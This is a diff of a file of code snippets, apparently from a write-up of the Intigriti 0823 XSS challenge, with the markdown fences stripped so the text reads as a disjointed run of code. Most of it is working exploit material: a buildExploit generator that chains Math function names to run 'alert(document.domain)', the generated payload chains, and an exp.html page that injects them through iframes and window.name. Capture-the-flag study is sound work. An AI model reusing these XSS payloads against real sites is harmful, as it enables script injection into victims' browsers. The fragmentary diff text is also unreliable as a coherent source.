@@ -9,20 +9,11 @@
 @memoryview.__basicsize__.__sub__
 @staticmethod.__basicsize__.__mul__
 @object.__instancecheck__
-class a:pass
-```
-
-
-
-```
+class a:
+pass
 var arr = []
 eval(arr.join(''.toString(arr.push('a'.toString()))))
 // Uncaught ReferenceError: a is not defined
-```
-
-
-
-```
 var arr = ['a','l','e','r']
 eval(
  arr.join(
@@ -39,19 +30,9 @@ eval(
  )
  )
 )
-```
-
-
-
-```
 Math.seeds = [1,2,3,4]
 Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop())))
 console.log(Math.seeds) // []
-```
-
-
-
-```
 function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []
@@ -74,56 +55,31 @@ function findTargetFromScope(scope, matchFn, initPath='') {
  continue
  }
  } catch(err){}
- 
+
  if (item && typeof item === 'object') {
  findTarget(item, newPath)
  }
  }
  }
 }
-```
-
-
-
-```
 console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math'))
 // Math.abs
 
 console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math'))
 // Math.clz32
-```
-
-
-
-```
-const findMathName = (index, char) => 
+const findMathName = (index, char) =>
  findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')
 
 console.log(findMathName(0, 'a')) // Math.abs
 console.log(findMathName(1, 'l')) // Math.clz32
-```
-
-
-
-```
 Math.seeds = []
 Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at()))))
-```
-
-
-
-```
 const mapping = [
  ['Math.LN2.valueOf'], // 0
  ['Math.LOG2E.valueOf'], // 1
  ['Math.E.valueOf'], // 2
  ['Math.PI.valueOf'], // 3
 ]
-```
-
-
-
-```
 function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
@@ -154,46 +110,16 @@ function findTargetNumber(init, target) {
 }
 console.log(findTargetNumber(5, '('.charCodeAt(0)))
 // ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']
-```
-
-
-
-```
 Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5)))))
-```
-
-
-
-```
 // 假設我們已經有想要的陣列了
 var arr = ['a','l','e','r','t','(',')']
 console.log(
  arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32)))
 )
 // alert()
-```
-
-
-
-```
 Function('alert()')()
-```
-
-
-
-```
 Math.abs.constructor('alert()')()
-```
-
-
-
-```
 Math.abs.constructor.call.call(Math.abs.constructor('alert()'))
-```
-
-
-
-```
 function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []
@@ -216,7 +142,7 @@ function findTargetFromScope(scope, matchFn, initPath='') {
  continue
  }
  } catch(err){}
- 
+
  if (item && typeof item === 'object') {
  findTarget(item, newPath)
  }
@@ -262,9 +188,9 @@ function buildExploit(arrName, content) {
  addFunction(`${arrName}.pop`)
  }
 
- const findMathName = (index, char) => 
+ const findMathName = (index, char) =>
  findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')
- 
+
  for(let char of content) {
 
  // if we can find it in the Math for the current index, use it
@@ -335,50 +261,23 @@ function buildExploit(arrName, content) {
 }
 
 console.log(buildExploit('Math.seeds', 'alert(document.domain)'))
-```
-
-
-
-```
 Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
-```
-
-
-
-```
 - exp.html (top)
 --- https://challenge-0823.intigriti.io (name: 'alert(1)')
 ------ https://challenge-0823.intigriti.io/challenge/index.html
-```
-
-
-
-```
 - exp.html (top)
 --- https://challenge-0823.intigriti.io (name: 'alert(1)')
 ------ https://challenge-0823.intigriti.io/challenge/index.html?q=...
-```
-
-
-
-```
 <script>
 setTimeout(() => {
 frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random')
 },3000)</script>
-<iframe srcdoc='
 
-<script>
 name = "alert(document.domain)"
 document.location = "https://challenge-0823.intigriti.io/"
 </script>
 '>
-</iframe>
-```
 
-
-
-```
 Math.random = function () {
  if (!this.seeds) {
  this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
@@ -387,17 +286,7 @@ Math.random = function () {
  next = next * 1103515245 + 12345
  return (next / 65536) % 32767
 }
-```
-
-
-
-```
 Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
-```
-
-
-
-```
 function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []
@@ -420,7 +309,7 @@ function findTargetFromScope(scope, matchFn, initPath='') {
  continue
  }
  } catch(err){}
- 
+
  if (item && typeof item === 'object') {
  findTarget(item, newPath)
  }
@@ -466,9 +355,9 @@ function buildExploit(arrName, content) {
  addFunction('Math.imul')
  addFunction('Math.seeds.splice')
 
- const findMathName = (index, char) => 
- findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor') 
- 
+ const findMathName = (index, char) =>
+ findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor')
+
  for(let char of content) {
  console.log(char)
 
